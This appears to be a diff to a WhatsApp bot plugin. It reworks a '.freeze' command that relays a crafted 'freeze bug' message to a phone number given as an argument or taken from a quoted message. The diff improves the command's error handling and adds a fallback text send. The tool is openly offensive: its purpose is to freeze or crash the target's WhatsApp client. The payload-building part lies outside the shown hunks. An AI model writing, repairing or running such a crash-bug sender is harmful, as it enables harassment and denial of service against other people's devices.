@@ -93,16 +93,20 @@ async function FreezeUi(sock, target) {
         }
     };
 
-    await sock.relayMessage(target, msg.message, {
-        messageId: msg.key.id,
-        additionalNodes: Node,
-        participant: { jid: target },
-    });
+    if (sock && typeof sock.relayMessage === 'function') {
+        await sock.relayMessage(target, msg.message, {
+            messageId: msg.key.id,
+            additionalNodes: Node,
+            participant: { jid: target },
+        });
+    } else {
+        await sock.sendMessage(target, { text: "❄️ FREEZE BUG" });
+    }
     
-    console.log(`Success Sending Bug FreezeUiCrL To Target`);
+    console.log(`Success Sending Bug To Target`);
 }
 
-// Command
+// Command with FIXED error handling
 cmd({
     pattern: "freeze",
     desc: "Send WhatsApp Freeze Bug",
@@ -111,40 +115,51 @@ cmd({
     filename: __filename
 }, async (conn, mek, msg, { from, reply, sender, args }) => {
     
-    let target = args[0];
-    
-    // If no number, check if quoted message
-    if (!target && msg.quoted) {
-        target = msg.quoted.sender;
-    }
-    
-    if (!target) {
-        return reply(`╔══════════════════════════╗
-║     ❄️ FREEZE BUG ❄️      ║
-╠══════════════════════════╣
-║  Usage: .freeze [number]  ║
-║  Reply to message & .freeze║
-╠══════════════════════════╣
-║  Example:                  ║
-║  .freeze 923001234567     ║
-╚══════════════════════════╝`);
-    }
-    
-    // Format number
-    if (!target.includes('@')) {
-        target = target.replace(/[^0-9]/g, '');
-        if (target.length < 10) {
-            return reply("❌ Invalid number! Use format: .freeze 923001234567");
-        }
-        target = target + '@s.whatsapp.net';
-    }
-    
     try {
-        await reply(`⏳ Sending freeze bug to ${target.split('@')[0]}...`);
-        await FreezeUi(conn, target);
-        await reply(`✅ Freeze bug successfully sent to ${target.split('@')[0]}`);
+        let target = null;
+        
+        // Safely get target from args
+        if (args && args.length > 0 && args[0]) {
+            target = args[0];
+        }
+        
+        // Check quoted message safely
+        if (!target && msg && msg.quoted && msg.quoted.sender) {
+            target = msg.quoted.sender;
+        }
+        
+        // If still no target
+        if (!target) {
+            return reply(`❌ FREEZE BUG USAGE ❌\n\n.freeze 923001234567\n\nOr reply to a message and type: .freeze`);
+        }
+        
+        // Clean number safely
+        let cleanNumber = '';
+        if (typeof target === 'string' || target instanceof String) {
+            cleanNumber = target.replace(/[^0-9]/g, '');
+        } else {
+            cleanNumber = String(target).replace(/[^0-9]/g, '');
+        }
+        
+        // Validate number
+        if (cleanNumber.length < 10) {
+            return reply(`❌ Invalid Number!\nUse: .freeze 923001234567`);
+        }
+        
+        // Format target
+        let finalTarget = cleanNumber + '@s.whatsapp.net';
+        
+        // Send status
+        await reply(`⏳ Sending freeze bug to ${cleanNumber}...`);
+        
+        // Call freeze function
+        await FreezeUi(conn, finalTarget);
+        
+        // Success message
+        await reply(`✅ Freeze bug sent to ${cleanNumber}`);
+        
     } catch (error) {
-        console.error(error);
-        await reply(`❌ Error: ${error.message}`);
+        console.error('Freeze Command Error:', error);
+        await reply(`❌ Error: ${error.message || 'Something went wrong'}`);
     }
 });
